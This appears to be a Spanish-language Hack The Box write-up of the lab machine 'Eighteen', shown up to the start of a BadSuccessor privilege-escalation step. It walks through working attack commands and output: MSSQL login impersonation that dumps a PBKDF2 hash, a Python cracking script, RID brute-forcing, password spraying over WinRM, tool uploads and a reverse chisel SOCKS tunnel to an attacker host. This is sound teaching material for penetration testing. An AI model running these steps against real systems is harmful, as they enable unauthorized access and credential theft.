---
title: "Eighteen - Hack The Box"
date: 2025-11-30
draft: false
slug: "htb-writeup-eighteen"
excerpt: "Esta fue una máquina sencilla al principio y al final se vuelve bastante complicada. Después de analizar los escaneos, vamos directamente a revisar la página web, pero al no encontrar algo útil, nos dirigimos con el servicio MSSQL. Enumeramos el MSSQL, siendo que descubrimos un usuario al que podemos suplantar y enumerar una base de datos perteneciente a la página web, donde logramos descubrir un Hash del algoritmo PBKDF2. Creamos un script de Python para poder crackear el Hash y aplicamos Password Spraying para descubrir a quién pertenece esa contraseña, logrando encontrar un usuario con el que podemos ganar acceso a la máquina víctima vía WinRM. Investigamos la versión de Windows y descubrimos que es vulnerable al ataque BadSuccessor, que logramos aplicar para obtener un TGS del servicio krbtgt y así obtenemos el Hash del Administrador con impacket-secretsdump, logrando escalar privilegios."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "Active Directory", "MSSQL", "WinRM", "Web Enumeration", "Fuzzing", "MSSQL Enumeration", "Cracking Hash", "Cracking PBKDF2 Hash", "Password Spraying", "RIDs Brute Force", "Tunneling SOCKS5", "BadSuccessor Attack", "Privesc - BadSuccessor Attack", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "ffuf"
  - "gobuster"
  - "nxc"
  - "impacket-mssqlclient"
  - "python3"
  - "evil-winrm"
  - "portscan.ps1"
  - "SharpSuccesor.ps1"
  - "chisel"
  - "Get-BadSuccessorOUPermissions.ps1"
  - "Rubeus.exe"
  - "proxychains"
  - "impacket-ticketConverter"
  - "timedatectl"
  - "curl"
  - "date"
  - "grep"
  - "cut"
  - "impacket-secretsdump"
links:
  - "https://hackviser.com/tactics/pentesting/services/mssql"
  - "https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-enumeration/#get-tables-from-a-specific-database"
  - "https://nishothan-17.medium.com/pbkdf2-hashing-algorithm-841d5cc9178d"
  - "https://github.com/logangoins/SharpSuccessor?tab=readme-ov-file"
  - "https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/portscan.ps1"
  - "https://kreep.in/badsuccessor-abusing-dmsas-for-ad-domination/"
  - "https://specterops.io/blog/2025/10/20/the-near-return-of-the-king-account-takeover-using-the-badsuccessor-technique/"
  - "https://www.hackingarticles.in/abusing-badsuccessor-dmsa-stealthy-privilege-escalation/"
  - "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe"
  - "https://github.com/akamai/BadSuccessor"
  - "https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory"
  - "https://github.com/gzzcoo/Rubeus"
  - "https://github.com/gzzcoo/SharpSuccessor"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-eighteen/eighteen.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.95
PING 10.10.11.95 (10.10.11.95) 56(84) bytes of data.
64 bytes from 10.10.11.95: icmp_seq=1 ttl=127 time=73.5 ms
64 bytes from 10.10.11.95: icmp_seq=2 ttl=127 time=70.1 ms
64 bytes from 10.10.11.95: icmp_seq=3 ttl=127 time=71.3 ms
64 bytes from 10.10.11.95: icmp_seq=4 ttl=127 time=69.5 ms

--- 10.10.11.95 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 69.457/71.086/73.494/1.548 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.95 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 20:06 CST
Initiating SYN Stealth Scan at 20:06
Scanning 10.10.11.95 [65535 ports]
Discovered open port 80/tcp on 10.10.11.95
Discovered open port 5985/tcp on 10.10.11.95
Discovered open port 1433/tcp on 10.10.11.95
Completed SYN Stealth Scan at 20:06, 26.95s elapsed (65535 total ports)
Nmap scan report for 10.10.11.95
Host is up, received user-set (0.17s latency).
Scanned at 2025-11-28 20:06:15 CST for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
80/tcp   open  http     syn-ack ttl 127
1433/tcp open  ms-sql-s syn-ack ttl 127
5985/tcp open  wsman    syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.04 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 28 (1.232KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Tenemos solo 3 puertos abiertos, pero me llama la atención que esta abierto el **servicio MSSQL y WinRM**.

Quizá la intrusión será por ahí.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 80,1433,5985 10.10.11.95 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 20:07 CST
Nmap scan report for 10.10.11.95
Host is up (0.072s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0

|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM

| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2025-11-29T09:07:08+00:00; +6h59m31s from scanner time.
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-29T03:48:11
|_Not valid after:  2055-11-29T03:48:11
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

|_clock-skew: mean: 6h59m31s, deviation: 0s, median: 6h59m30s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.17 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Tenemos bastante información:
* La página web activa en el **puerto 80** se redirige al dominio `http://eighteen.htb/`.
* El escaneo nos da información sobre el dominio que ocupa el **servicio MSSQL**, siendo el `DC01.eighteen.htb`.
* Tenemos unas credenciales de acceso que nos proporcionan, siendo `kevin:iNa2we6haRj2gaw!`, por lo que podemos probarlas en **MSSQL o WinRM**.

Vamos a registrar los dominios descubiertos, en el `etc/hosts`:
```bash
echo "10.10.11.95 eighteen.htb DC01.eighteen.htb" >> /etc/hosts 
```
Listo, ahora vamos a empezar con la página web y luego con el **servicio MSSQL**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-eighteen/Captura1.png">
</p>

Parece ser una página dedicada al control financiero de un usuario.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-eighteen/Captura2.png">
</p>

No hay mucho que destacar.

Analizando la página principal, vemos que hay una página que nos permite registrarnos:

<p align="center">
<img src="/assets/images/htb-writeup-eighteen/Captura3.png">
</p>

Una vez registrados, podemos entrar al login y ahí veremos un dashboard:

<p align="center">
<img src="/assets/images/htb-writeup-eighteen/Captura4.png">
</p>

Dentro vemos que se pueden hacer transacciones para monitorear las finanzas propias, pero lo interesante es ver que podemos entrar como administrador si es que tenemos los permisos:

<p align="center">
<img src="/assets/images/htb-writeup-eighteen/Captura4.png">
</p>

Como no los tenemos, nos da un error.

Esto podría ser un vector de ataque, pero antes de probar algo aquí, veamos si existe algún directorio oculto aplicando **Fuzzzing**.

### Fuzzing {#fuzz}

Primero utilizaremos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://eighteen.htb/FUZZ -t 300 -fs 2253

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://eighteen.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2253
________________________________________________

admin                   [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 201ms]
features                [Status: 200, Size: 2822, Words: 849, Lines: 88, Duration: 952ms]
register                [Status: 200, Size: 2421, Words: 762, Lines: 76, Duration: 1043ms]
login                   [Status: 200, Size: 1961, Words: 602, Lines: 66, Duration: 1493ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 320ms]
dashboard               [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 568ms]
login%3f                [Status: 200, Size: 1961, Words: 602, Lines: 66, Duration: 261ms]
:: Progress: [220545/220545] :: Job [1/1] :: 673 req/sec :: Duration: [0:05:23] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-fs*      | Para aplicar un filtro para que no muestre resultados de X tamaño. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://eighteen.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 --ne
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://eighteen.htb
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1961]
/register             (Status: 200) [Size: 2421]
/features             (Status: 200) [Size: 2822]
/admin                (Status: 302) [Size: 199] [--> /login]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 199] [--> /login]
Progress: 220544 / 220544 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *--ne*     | Para indicar que no muestre errores. |

No encontramos algo más, pues todas las páginas las encontramos en la enumeración inicial.

Dejemos la página web y vayamos a probar las credenciales en el **servicio MSSQL**.

### Enumeración de Servicio MSSQL {#MSSQL}

Comprobemos si funcionan las credenciales que tenemos con el **servicio MSSQL**:
```bash
nxc mssql 10.10.11.95 -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!
```
Sí funcionan y algo que podemos notar es la versión de **Windows** que se está utilizando, siendo el **Windows 11 / Server 2025 Build 26100**.

Entremos al **MSSQL** usando la herramienta **impacket-mssqlclient**:
```batch
impacket-mssqlclient 'kevin:iNa2we6haRj2gaw!@10.10.11.95'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (kevin  guest@master)>
```
Estamos dentro.

Veamos qué bases de datos existen:
```batch
SQL (kevin  guest@master)> enum_db
name                is_trustworthy_on   
-----------------   -----------------   
master                              0   

tempdb                              0   

model                               0   

msdb                                1   

financial_planner                   0
```
Muy bien, vemos que hay una BD llamada `financial_planner`.

Pero nuestro usuario actual no tiene los privilegios necesarios para poder usar esta BD y enumerarla:
```batch
SQL (kevin  guest@master)> use financial_planner;
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
```
Esto quiere decir que debe haber otros usuarios que sí tengan los permisos necesarios.

Si revisamos los logins, veremos que hay un usuario llamado **appdev**:
```batch
SQL (kevin  guest@master)> enum_logins
name     type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
------   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa       SQL_LOGIN             0          1               0             0            0              0           0           0           0   

kevin    SQL_LOGIN             0          0               0             0            0              0           0           0           0   

appdev   SQL_LOGIN             0          0               0             0            0              0           0           0           0
```

Revisemos si tenemos el permiso de suplantar a este usuario:
```batch
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev
```
Sí podemos.

Podemos usar el comando **exec_as_login** para suplantar al **usuario appdev**:
```batch
SQL (kevin  guest@master)> exec_as_login appdev
SQL (appdev  appdev@master)>
```
Listo.

Probemos si ya podemos usar la BD `financial_planner`:
```batch
SQL (appdev  appdev@master)> use financial_planner;
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
```
Excelente, ya podemos usarla.

Veamos qué tablas existen en la BD:
```batch
SQL (appdev  appdev@financial_planner)> SELECT name FROM financial_planner.sys.tables
name          
-----------   
users         

incomes       

expenses      

allocations   

analytics     

visits
```
Hay varias tablas, pero la interesante es la tabla **users**.

Obtengamos directamente su contenido:
```batch
SQL (appdev  appdev@financial_planner)> select * from users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03
```
Genial, encontramos un Hash y vemos que pertenece al **usuario admin**, que supongo pertenece a la página web o puede que pertenezca a la máquina víctima.

Intentemos crackear este Hash.

## Explotación de Vulnerabilidades {#Explotacion}

### Crackeando Hash de PBKDF2 con Script de Python {#Cracking}

Investiguemos el formato del Hash:

| **Algoritmo Hash PBKDF2** |
|:-------------------------:|
| *PBKDF2 es un algoritmo de hashing de contraseñas que utiliza "fortalecimiento" con sales y múltiples iteraciones para hacer el proceso de hash más lento y seguro, protegiendo las contraseñas contra ataques de fuerza bruta. La sal es un valor aleatorio único que se agrega a cada contraseña antes de aplicar el hash, y el gran número de iteraciones aumenta significativamente el tiempo de cálculo, haciendo más difícil descifrar las contraseñas.* |

Podemos separar este Hash en distintas partes para identificar sus elementos, quedando de esta forma:
* *Algoritmo Encriptación*: `pbkdf2-sha256`
* *Iteraciones*: `600000`
* *Salt*: `AMtzteQIG7yAbZIa`
* *Hash*: `0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`

Pero para realizar el crackeo, se vuelve complicado utilizando nuestras herramientas **JohnTheRipper** y **Hashcat**.

Nos apoyamos con **ChatGPT** para crear un script de **Python** que utiliza la **librería Hashlib** para crackear el Hash, obteniendo el siguiente script:
```python
#/usr/bin/python3
import hashlib
import binascii

# Hash y Wordlist
hash_string = "pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
wordlist_path = "/usr/share/wordlists/metasploit/unix_passwords.txt"

# Parseo del Hash
try:
    method, algo, iterations_and_rest = hash_string.split(":")
    iterations, salt_and_hash = iterations_and_rest.split("$", 1)
    salt, real_hash = salt_and_hash.split("$")

    iterations = int(iterations)
except Exception as e:
    print("Error al parsear el hash:", e)
    exit()

# Convertir a bytes
salt_bytes = salt.encode()
real_hash_bytes = binascii.unhexlify(real_hash)

# Función para probar la contraseña
def check_password(password):
    password_bytes = password.encode()
    dk = hashlib.pbkdf2_hmac('sha256', password_bytes, salt_bytes, iterations)
    return dk == real_hash_bytes

# Realizando el crackeo
print("\t######-Cracking PBKDF2 Hash-######\n")
print("[*] Iniciando ataque con wordlist...\n")

with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        pwd = line.strip()
        if not pwd:
            continue

        if check_password(pwd):
            print("\n[+] CONTRASEÑA ENCONTRADA:", pwd)
            exit()

        print(f"[-] Probando: {pwd}", end="\r")

print("\n[-] No se encontró la contraseña en el diccionario.")
```
Te explico el script:
* El script está creado para funcionar contra Hashes del siguiente estilo: `pbkdf2:sha256:ITERACIONES$SALT$HASH`
* Se basa en **hashlib.pbkdf2_hmac**, por lo que es exacto y compatible con hashes de **Flask, Django, Werkzeug, Passlib**, etc.
* **PBKDF2** con **600k iteraciones** es relativamente lento, así que este script probará entre 150–500 contraseñas por segundo según tu **CPU**.
* Utilice el wordlist **unix_passwords.txt** de **Metasploit** por tener contraseñas comunes, pero puedes poner el wordlist de tu gusto.

Bien, ejecutemos el script:
```bash
python3 CrackHash.py
	######-Cracking PBKDF2 Hash-######

[*] Iniciando ataque con wordlist...

[-] Probando: ronaldoy1y
[+] CONTRASEÑA ENCONTRADA: **********
```
Perfecto, tenemos una contraseña.

El problema es que no sabemos a qué usuario pertenece y el **usuario appdev** que vimos en el **MSSQL** no servirá.

Podemos resolver esto con la herramienta **netexec**.

### Aplicando Fuerza Bruta a RIDS Vía MSSQL y Aplicando Password Spraying para Ganar Acceso a Máquina Víctima Vía WinRM {#RidsPS}

Utilizaremos la herramienta **netexec** para enumerar los usuarios de la máquina víctima, usando el ataque de fuerza bruta a **RIDS** y las credenciales que nos dieron:
```bash
nxc mssql 10.10.11.95 -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!
...
MSSQL       10.10.11.95     1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.10.11.95     1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.10.11.95     1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.10.11.95     1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.10.11.95     1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.10.11.95     1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.10.11.95     1433   DC01             1612: EIGHTEEN\dave.green
```
Genial, funcionó y obtuvimos varios usuarios.

Cópialos en un archivo de texto:
```bash
cat usuarios.txt
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
```
Ahora, podemos ocupar estos usuarios para aplicarles **Password Spraying** e identificar si a alguien le pertenece la contraseña que obtuvimos del crackeo.

También usaremos **netexec** para aplicar este ataque:
```bash
nxc winrm 10.10.11.95 -u usuarios.txt -p '**********' --no-bruteforce --continue-on-success
WINRM       10.10.11.95     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\jamie.dunn:**********
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\jane.smith:**********
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\alice.jones:**********
WINRM       10.10.11.95     5985   DC01             [+] eighteen.htb\adam.scott:********** (Pwn3d!)
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\bob.brown:**********
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\carol.white:**********
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\dave.green:**********
```
Parece que la contraseña funciona con el **usuario adam.scott**.

Utilicemos esas credenciales para autenticarnos al **servicio WinRM**, usando la herramienta **Evil-WinRM**:
```batch
evil-winrm -i 10.10.11.95 -u 'adam.scott' -p '**********'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.scott\Documents> whoami
eighteen\adam.scott
```

En el **Desktop** encontraremos la flag del usuario:
```batch
*Evil-WinRM* PS C:\Users\adam.scott\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
...
```
Continuemos.

## Post Explotación {#Post}

### Aplicando el Ataque BadSuccessor para Dumpear Hash de Administrador {#Bad}

Después de perder bastante tiempo usando distintos Exploits para escalar privilegios, decidí investigar la versión del SO, siendo así que posiblemente la máquina sea vulnerable al **ataque BadSuccessor**.

| **BadSuccessor Attack** |
|:-----------------------:|
| *El ataque BadSuccessor es un ataque relativamente nuevo dentro del ecosistema de Active Directory (AD) y Kerberos, y está ligado a la explotación de la delegación de tickets y la forma en que AD maneja los TGS (Ticket Granting Service) y las relaciones de sucesión de cuentas. El ataque BadSuccessor aprovecha un problema en la forma en que Active Directory valida la relación de sucesión de tickets. En otras palabras, es un ataque de delegación abusiva, muy parecido conceptualmente a Kerberoasting o Overpass-the-Hash, pero más enfocado en la delegación S4U.* |

Aquí hay algunos blogs que explican cómo explotar la vulnerabilidad:
* <a href="https://www.hackingarticles.in/abusing-badsuccessor-dmsa-stealthy-privilege-escalation/" target="_blank">Abusing BadSuccessor (dMSA): Stealthy Privilege Escalation</a>
* <a href="https://specterops.io/blog/2025/10/20/the-near-return-of-the-king-account-takeover-using-the-badsuccessor-technique/" target="_blank">The (Near) Return of the King: Account Takeover Using the BadSuccessor Technique</a>
* <a href="https://kreep.in/badsuccessor-abusing-dmsas-for-ad-domination/" target="_blank">BadSuccessor: Abusing dMSAs for AD Domination</a>
* <a href="https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory" target="_blank">BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory</a>

La idea para explotar la vulnerabilidad es la siguiente:
* Comprometer una cuenta con permisos limitados (por ejemplo, un usuario normal o un servicio o un grupo).
* Obtener un **TGT** para esa cuenta comprometida.
* Solicitar un **TGS** para otro servicio en nombre de otra cuenta (**S4U2Self → S4U2Proxy**).
* Explotar la falla de validación: el **KDC** otorga un ticket que no debería haber dado.
* Usar ese ticket para autenticarse ante servicios privilegiados, obtener hashes de servicios o mover lateralmente en el dominio.

Para aplicar este ataque, necesitaremos las siguientes herramientas:
* <a href="https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/portscan.ps1" target="_blank">Repositorio de LuemmelSec: portscan.ps1</a>
* <a href="https://github.com/akamai/BadSuccessor" target="_blank">Repositorio de akamai: BadSuccessor</a>
* <a href="https://github.com/gzzcoo/SharpSuccessor" target="_blank">Repositorio de gzzcoo: SharpSuccessor</a>
* <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe" target="_blank">Repositorio de r3motecontrol: Rubeus.exe</a>
* <a href="https://github.com/jpillora/chisel" target="_blank">Repositorio de jpillora: chisel</a>

Descárgalas todas en tu directorio de trabajo.

Una vez que ya tengas todas las herramientas, cárgalas a la sesión de **Evil-WinRM** (te recomiendo crear tu propio directorio):
```batch
*Evil-WinRM* PS C:\Brsk> upload Get-BadSuccessorOUPermissions.ps1
*Evil-WinRM* PS C:\Brsk> upload portscan.ps1
*Evil-WinRM* PS C:\Brsk> upload chisel.exe
*Evil-WinRM* PS C:\Brsk> upload SharpSuccessor.exe
*Evil-WinRM* PS C:\Brsk> upload Rubeus.exe
```
Preparemos cada paso para explotar esta vulnerabilidad.

#### Aplicando Tunneling con SOCKS y Chisel para Exponer Puertos Internos de Máquina Víctima {#PortForwarding}

Al investigar los servicios de la máquina, no llegamos a ver expuesto el servicio **Kerberos, LDAP, RPC o SMB**, por lo que podemos usar el script **portscan.ps1** para comprobar si están activos de manera interna:
```batch
*Evil-WinRM* PS C:\Brsk> scan -IPStart 127.0.0.1 -IPEnd 127.0.0.1 -PortScan -ports 88,135,389,445 -DNS

:::::::::   ::::::::   ::::::::  :::::::::
:+:    :+: :+:    :+: :+:    :+: :+:    :+:
+:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+
+#++:++#+  +#+    +:+ +#+    +:+ +#++:++#:
+#+        +#+    +#+ +#+    +#+ +#+    +#+
#+#        #+#    #+# #+#    #+# #+#    #+#
###         ########   ########  ###    ###

::::    ::::      :::     ::::    :::  ::::::::
+:+:+: :+:+:+   :+: :+:   :+:+:   :+: :+:    :+:
+:+ +:+:+ +:+  +:+   +:+  :+:+:+  +:+ +:+
+#+  +:+  +#+ +#++:++#++: +#+ +:+ +#+ +#++:++#++
+#+       +#+ +#+     +#+ +#+  +#+#+#        +#+
#+#       #+# #+#     #+# #+#   #+#+# #+#    #+#
###       ### ###     ### ###    ####  ########

::::    ::: ::::    ::::      :::     :::::::::
:+:+:   :+: +:+:+: :+:+:+   :+: :+:   :+:    :+:
:+:+:+  +:+ +:+ +:+:+ +:+  +:+   +:+  +:+    +:+
+#+ +:+ +#+ +#+  +:+  +#+ +#++:++#++: +#++:++#+
+#+  +#+#+# +#+       +#+ +#+     +#+ +#+
#+#   #+#+# #+#       #+# #+#     #+# #+#
###    #### ###       ### ###     ### ###

A small and portable portscanner by @LuemmelSec

IP        DNS                  PING PORTS
--        ---                  ---- -----
127.0.0.1 DC01.eighteen.htb Success {88, 135, 389, 445}
```
Sí están activos.

Vamos a aplicar **Port Forwarding** utilizando **SOCKS** para hacer un túnel y no tener que exponer cada puerto de forma manual.

Entonces, inicia **chisel** en tu máquina como servidor **SOCKS**:
```bash
./chisel server -p 9001 --reverse --socks5
2025/11/30 16:16:27 server: Reverse tunnelling enabled
2025/11/30 16:16:27 server: Fingerprint 8kv...
2025/11/30 16:16:27 server: Listening on http://0.0.0.0:9001
```

Revisa que tengas la siguiente configuración en el archivo `/etc/proxychains4.conf`: 
```bash
nano /etc/proxychains4.conf
-------------
...
[ProxyList]
socks5          127.0.0.1 1080
```

Desde la sesión de **Evil-WinRM**, conéctate al servidor indicando la creación de un túnel **SOCKS**:
```batch
*Evil-WinRM* PS C:\Brsk> .\chisel.exe client Tu_IP:9001 R:socks
```
Con esto ya tenemos listo el túnel.

Podemos hacer un escaneo rápido hacia nuestra máquina para identificar los puertos de la máquina víctima, por ejemplo, los **puertos 88, 135, 139, 389, 445, 464**:
```bash
proxychains nmap -sT -Pn -n -p 88,135,139,389,445,464 DC01.eighteen.htb
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 18:19 CST
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:139  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:464  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:389  ...  OK
